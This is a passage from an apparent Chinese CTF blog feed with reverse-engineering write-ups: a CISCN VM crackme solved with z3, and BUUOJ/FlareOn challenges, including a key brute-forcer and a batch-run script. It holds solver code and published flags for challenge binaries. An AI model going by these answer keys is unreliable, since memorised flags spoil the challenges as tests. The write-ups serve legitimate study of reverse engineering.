&gt;&gt; 7 ) &amp; 1) !&#x3D; 0 goto 168</span><br><span class="line">158 b&#39;\xff\xff&#39;</span><br><span class="line">159 print N</span><br><span class="line">161 print o</span><br><span class="line">163 print !</span><br><span class="line">165 print \x0a</span><br><span class="line">167 exit(0)</span><br><span class="line">169 if ((mem[ 4 ] &gt;&gt; 4 ) &amp; 1) !&#x3D; 0 goto 190</span><br><span class="line">170 goto 172</span><br><span class="line">171 b&#39;\xff\xff&#39;</span><br><span class="line">172 if ((mem[ 20 ] &gt;&gt; 0 ) &amp; 1) &#x3D;&#x3D; 0 goto 190</span><br><span class="line">173 nop</span><br><span class="line">174 b&#39;\xff\xff&#39;</span><br><span class="line">175 if ((mem[ 2 ] &gt;&gt; 1 ) &amp; 1) !&#x3D; 0 goto 179 ; 由于ffff后会直接跳过下一个，所以这一句也没有用</span><br><span class="line">176 goto 180</span><br><span class="line">177 if ((mem[ 1 ] &gt;&gt; 3 ) &amp; 1) !&#x3D; 0 goto 189</span><br><span class="line">178 if ((mem[ 3 ] &gt;&gt; 3 ) &amp; 1) &#x3D;&#x3D; 0 goto 189</span><br><span class="line">179 b&#39;\xff\xff&#39;</span><br><span class="line">180 print N</span><br><span class="line">182 print o</span><br><span class="line">184 print !</span><br><span class="line">186 print \x0a</span><br><span class="line">188 exit(0)</span><br></pre></td></tr></table></figure><p>二进制文件中出现了很多奇奇怪怪的 <code>\xFF\xFF</code>，感觉起到了一部分的花指令作用，所以对于不满足的情况全部拆开处理了，但这又导致读取后的逻辑不是很清晰，需要进行简单的手动分析</p><blockquote><p>程序中 <code>if ((mem[ 1 ] &gt;&gt; 3 ) &amp; 1) != 0</code> 之间空格实际上是为了后续进一步读取准备的</p></blockquote><p>分析时可以看出，flag的判断逻辑显然是对输入的每一比特加了限定，目的就是跳过所有的退出</p><p>对这一部分手动分析，删掉没有用的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">112 if ((mem[ 12 ] &gt;&gt; 5 ) &amp; 1) !&#x3D; 0 goto 125</span><br><span class="line">114 if ((mem[ 19 ] &gt;&gt; 2 ) &amp; 1) &#x3D;&#x3D; 0 goto 125</span><br><span class="line">115 print No!</span><br><span class="line">123 exit(0)</span><br><span class="line">125 goto 127</span><br><span class="line">126 if ((mem[ 22 ] &gt;&gt; 6 ) &amp; 1) !&#x3D; 0 goto 146 ; 这句话也没有用，但自动提取时不容易处理，仍然保留</span><br><span class="line">127 goto 131</span><br><span class="line">131 goto 133</span><br><span class="line">133 if ((mem[ 30 ] &gt;&gt; 5 ) &amp; 1) &#x3D;&#x3D; 0 goto 146</span><br><span class="line">136 print No!</span><br><span class="line">144 exit(0)</span><br><span class="line">146 nop</span><br><span class="line">147 if ((mem[ 6 ] &gt;&gt; 4 ) &amp; 1) !&#x3D; 0 goto 169</span><br><span class="line">148 goto 150</span><br><span class="line">150 goto 154</span><br><span class="line">154 if ((mem[ 8 ] &gt;&gt; 0 ) &amp; 1) &#x3D;&#x3D; 0 goto 169</span><br><span class="line">155 goto 159</span><br><span class="line">159 print No!</span><br><span class="line">167 exit(0)</span><br><span class="line">169 if ((mem[ 4 ] &gt;&gt; 4 ) &amp; 1) !&#x3D; 0 goto 190</span><br><span class="line">170 goto 172</span><br><span class="line">172 if ((mem[ 20 ] &gt;&gt; 0 ) &amp; 1) &#x3D;&#x3D; 0 goto 190</span><br><span class="line">173 nop</span><br><span class="line">176 goto 180</span><br><span class="line">180 print No!</span><br><span class="line">188 exit(0)</span><br></pre></td></tr></table></figure><p>可以看到，可用的跳转一定是跳转到exit后面的，这样就可以实现一个自动化脚本了</p><p><code>extract.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">infile = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = infile.read()</span><br><span class="line">code = code.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exit&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        target.append(<span class="built_in">str</span>(<span class="built_in">int</span>(line.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]) + <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print (target)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> code:</span><br><span class="line">    tmp = line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="number">-1</span>] <span class="keyword">in</span> target:</span><br><span class="line">        <span class="built_in">print</span> (line)</span><br></pre></td></tr></table></figure><p>最后再自动生成一个z3脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">in_list</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> in_list[<span class="number">2</span>] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">        ret += <span class="string">&#x27;eq(&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> in_list[<span class="number">2</span>] == <span class="string">&#x27;!=&#x27;</span>:</span><br><span class="line">        ret += <span class="string">&#x27;neq(&#x27;</span></span><br><span class="line">    ret += in_list[<span class="number">0</span>] + <span class="string">&#x27;, &#x27;</span> + in_list[<span class="number">1</span>]</span><br><span class="line">    ret += <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">infile = <span class="built_in">open</span>(<span class="string">&#x27;2.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&#x27;&#x27;from z3 import *</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s = Solver()</span></span><br><span class="line"><span class="string">flag = [BitVec(&#x27;flag%d&#x27; % i, 8) for i in range(32)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for f in flag:</span></span><br><span class="line"><span class="string">    s.add(f &gt; 0x20)</span></span><br><span class="line"><span class="string">    s.add(f &lt; 0x7f)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def eq(pos_f, pos_b):</span></span><br><span class="line"><span class="string">    return flag[pos_f] &amp; (1 &lt;&lt; pos_b) == 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def neq(pos_f, pos_b):</span></span><br><span class="line"><span class="string">    return flag[pos_f] &amp; (1 &lt;&lt; pos_b) != 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lines = infile.read()</span><br><span class="line">lines = lines.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    a, b = lines[i], lines[i + <span class="number">1</span>]</span><br><span class="line">    a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    b = b.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    a = [a[<span class="number">3</span>], a[<span class="number">6</span>], a[<span class="number">-4</span>]]</span><br><span class="line">    b = [b[<span class="number">3</span>], b[<span class="number">6</span>], b[<span class="number">-4</span>]]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;s.add(Or(&#x27;</span> + fmt(a) + <span class="string">&#x27;, &#x27;</span> + fmt(b) + <span class="string">&#x27;))&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if s.check() == sat:</span></span><br><span class="line"><span class="string">    model = s.model()</span></span><br><span class="line"><span class="string">    for f in flag:</span></span><br><span class="line"><span class="string">        print (chr(model[f].as_long().real), end = &#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print (&#x27;\\nfinish&#x27;)&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行之后就可以得到flag了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python3 vmreader.py &gt; 1.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 extract.py &gt; 2.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 to_py.py &gt; 3.py</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 3.py</span></span><br><span class="line">flag&#123;_2_SAT_15_a_P_pr0b13M_4F6v&#125;</span><br><span class="line">finish</span><br><span class="line"><span class="meta">#</span><span class="bash"> ./vs</span></span><br><span class="line">Please input your flag: flag&#123;_2_SAT_15_a_P_pr0b13M_4F6v&#125;</span><br><span class="line">Congratulation!</span><br></pre></td></tr></table></figure><p>通过程序验证</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是第一次在一个逆向题目中写这么多代码，最近又看到一些需要写代码的题目，还是需要提高开发能力啊</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目质量很高，终于补完了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;imnotavirus&lt;/li&gt;
&lt;li&gt;内卷&lt;/li&gt;
&lt;li&gt;vs&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="CISCN" scheme="https://s0uthwood.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ RE (2)</title>
    <link href="https://s0uthwood.github.io/2021/06/10/BUUOJ%E9%83%A8%E5%88%86RE%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://s0uthwood.github.io/2021/06/10/BUUOJ%E9%83%A8%E5%88%86RE%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-06-09T19:20:33.000Z</published>
    <updated>2021-07-14T10:58:11.918Z</updated>
    
    <content type="html"><![CDATA[<ul><li>firmware：工控逆向</li><li>[FlareOn4]greek_to_me：SMC校验</li><li>[FlareOn6]Memecat Battlestation：baby .NET （不写wp了）</li><li>[FlareOn5]FLEGGO</li><li>[MR2020]Shit：花指令</li><li>[SUCTF2018]HelloPython</li></ul><a id="more"></a><h1 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h1><p>一道水题，主要学习一下工控逆向</p><p>不难看出，给的附件是squashfs文件，直接进行binwalk</p><blockquote><p>在安装sasquatch时遇到了一些坑，好像必须clone到~/Downloads等文件夹内才行</p></blockquote><p>binwalk之后逛一下目录，能够找到一个叫做 <code>backdoor</code> 的二进制文件</p><p>目标是找到连接的ip和端口，进去找一找就能看到</p><h1 id="FlareOn4-greek-to-me"><a href="#FlareOn4-greek-to-me" class="headerlink" title="[FlareOn4]greek_to_me"></a>[FlareOn4]greek_to_me</h1><p>尝试运行一下，发现不能输入</p><p>逆向，发现127.0.0.1的字样，以及socket等明显的网络通信函数</p><p>直接运行的时候看一下主机端口，发现是 <code>127.0.0.1:2222</code>，用Windows下的nc连上去就可以进行调试了</p><p>SMC还是很明显的</p><p>发现解SMC时仅用了第一个字节，但由于不知道里面有什么，猜测可能是对后面的字节进行验证，所以决定将程序本地复现一下，爆破解SMC的密钥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span>, <span class="number">0x99</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x16</span>, <span class="number">0xF0</span>, <span class="number">0x32</span>, </span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xC4</span>, <span class="number">0x91</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x14</span>, <span class="number">0xF0</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, </span><br><span class="line">  <span class="number">0x15</span>, <span class="number">0xF1</span>, <span class="number">0xC4</span>, <span class="number">0x91</span>, <span class="number">0x1A</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x1B</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x18</span>, <span class="number">0xF2</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x19</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x1E</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xC4</span>, <span class="number">0x99</span>, <span class="number">0x1F</span>, <span class="number">0xC4</span>, <span class="number">0x91</span>, <span class="number">0x1C</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x1D</span>, </span><br><span class="line">  <span class="number">0xE6</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x62</span>, <span class="number">0xEF</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x63</span>, <span class="number">0xF2</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x60</span>, <span class="number">0xE3</span>, <span class="number">0xC4</span>, <span class="number">0x99</span>, <span class="number">0x61</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x66</span>, <span class="number">0xBC</span>, </span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x67</span>, <span class="number">0xE6</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x64</span>, <span class="number">0xE8</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x9D</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x6A</span>, <span class="number">0xF2</span>, <span class="number">0xC4</span>, <span class="number">0x99</span>, <span class="number">0x6B</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x68</span>, <span class="number">0xA9</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x69</span>, <span class="number">0xEF</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x6F</span>, <span class="number">0xAE</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x6C</span>, <span class="number">0xE3</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x6D</span>, <span class="number">0xEF</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x72</span>, <span class="number">0xE9</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, </span><br><span class="line">  <span class="number">0x7C</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIBYTE(x) ((x &amp; 0xFF00) &gt;&gt; 8)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">short</span> buf = <span class="number">0</span>; buf &lt;= <span class="number">0xff</span>; buf++)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> new_char[<span class="number">130</span>]; </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *a1 = new_char;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            *a1 = (buf ^ ida_chars[i++]) + <span class="number">34</span>;</span><br><span class="line">            ++a1;</span><br><span class="line">        &#125; <span class="keyword">while</span> ( i &lt; <span class="number">121</span> );</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> v2 = <span class="number">0x79</span>;                                      <span class="comment">// 0x79</span></span><br><span class="line">        a1 = new_char;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> v3 = <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">255</span>; v2; v3 = HIBYTE(v3) + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v3 ) &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">short</span> v5 = i;</span><br><span class="line">            <span class="keyword">int</span> v6 = v2;</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt; <span class="number">0x14</span> )</span><br><span class="line">                v6 = <span class="number">0x14</span>;</span><br><span class="line">            v2 -= v6;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                v5 += *a1;</span><br><span class="line">                v3 += v5;</span><br><span class="line">                ++a1;</span><br><span class="line">                --v6;</span><br><span class="line">            &#125; <span class="keyword">while</span> ( v6 );</span><br><span class="line">            i = HIBYTE(v5) + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ret = (HIBYTE(i) + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)i) | ((v3 &lt;&lt; <span class="number">8</span>) + (v3 &amp; <span class="number">0xFF00</span>));</span><br><span class="line">        <span class="comment">// if (buf == &#x27;f&#x27;) </span></span><br><span class="line">        <span class="comment">//     printf(&quot;%x\n&quot;, ret); // 0xf51c</span></span><br><span class="line">        <span class="comment">// if (buf == &#x27;@&#x27;)</span></span><br><span class="line">        <span class="comment">//     printf(&quot;%x\n&quot;, ret); // 0x60ee</span></span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">0xFB5E</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// printf(&quot;%c %x\n&quot;, buf, ret);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始给的范围小了（以为会是可见字符），一直爆破不出来，反复验证了好多次，后来才发现范围是 <code>0-0xff</code> </p><p>最后爆破出来是 <code>0xA2</code>，思考了一下怎么nc传递不可见字符，然后决定直接动调改内存</p><p>下断点，然后修改buf，之后看一眼SMC解密结果，发现直接给flag了，去栈里dump一下</p><h1 id="FlareOn5-FLEGGO"><a href="#FlareOn5-FLEGGO" class="headerlink" title="[FlareOn5]FLEGGO"></a>[FlareOn5]FLEGGO</h1><p>看名字还以为是个go呢，结果发现是个披着re外套的misc（流汗</p><p>解压后发现有一堆程序，先随便挑一个日</p><p>动调发现需要输入一串字符串，刚开始还想看看是不是和base64有关，后来发现这串字符串就在exe文件中，那就直接上python整批量操作了</p><p>发现password存的地址是固定的，那就用subprocess对每个exe运行一下</p><p>放个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line">files = [</span><br><span class="line">    <span class="string">&quot;./1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./1JpPaUMynR9GflWbxfYvZviqiCB59RcI.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./2AljFfLleprkThTHuVvg63I7OgjG2LQT.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./3Jh0ELkck1MuRvzr8PLIpBNUGlspmGnu.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./4ihY3RWK4WYqI4XOXLtAH6XV5lkoIdgv.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./7mCysSKfiHJ4WqH2T8ERLE33Wrbp6Mqe.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./AEVYfSTJwubrlJKgxV8RAl0AdZJ5vhhy.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./BG3IDbHOUt9yHumPceLTVbObBHFneYEu.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./Bl0Iv5lT6wkpVCuy7jtcva7qka8WtLYY.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./Bp7836noYu71VAWc27sUdfaGwieALfc2.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./E36RGTbCE4LDtyLi97l9lSFoR7xVMKGN.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./Ew93SSPDbgiQYo4E4035A16MJUxXegDW.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./HDHugJBqTJqKKVtqi3sfR4BTq6P5XLZY.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./IXITujCLucnD4P3YrXOud5gC7Bwcw6mr.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./JIdE7SESzC1aS58Wwe5j3i6XbpkCa3S6.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./JXADoHafRHDyHmcTUjEBOvqq95spU7sj.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./K7HjR3Hf10SGG7rgke9WrRfxqhaGixS0.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./MrA1JmEDfPhnTi5MNMhqVS8aaTKdxbMe.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./NaobGsJ2w6qqblcIsj4QYNIBQhg3gmTR.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./P2PxxSJpnquBQ3xCvLoYj4pD3iyQcaKj.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./PvlqINbYjAY1E4WFfc2N6rZ2nKVhNZTP.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./SDIADRKhATsagJ3K8WwaNcQ52708TyRo.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./SeDdxvPJFHCr7uoQMjwmdRBAYEelHBZB.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./aSfSVMn7B8eRtxgJgwPP5Y5HiDEidvKg.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./azcyERV8HUbXmqPTEq5JFt7Ax1W5K4wl.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./bmYBZTBJlaFNbbwpiOiiQVdzimx8QVTI.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./cWvFLbliUfJl7KFDUYF1ABBFYFb6FJMz.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./d4NlRo5umkvWhZ2FmEG32rXBNeSSLt2Q.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./dT4Xze8paLOG7srCdGLsbLE1s6m3EsfX.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./dnAciAGVdlovQFSJmNiPOdHjkM3Ji18o.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./eEJhUoNbuc40kLHRo8GB7bwFPkuhgaVN.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./eovBHrlDb809jf08yaAcSzcX4T37F1NI.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./gFZw7lPUlbOXBvHRc31HJI5PKwy745Wv.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./hajfdokqjogmoWfpyp4w0feoeyhs1QLo.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./iJO15JsCa1bV5anXnZ9dTC9iWbEDmdtf.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./jJHgJjbyeWTTyQqISuJMpEGgE1aFs5ZB.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./kGQY35HJ7gvXzDJLWe8mabs3oKpwCo6L.exe&quot;</span>,</span><br><span class="line">    <span 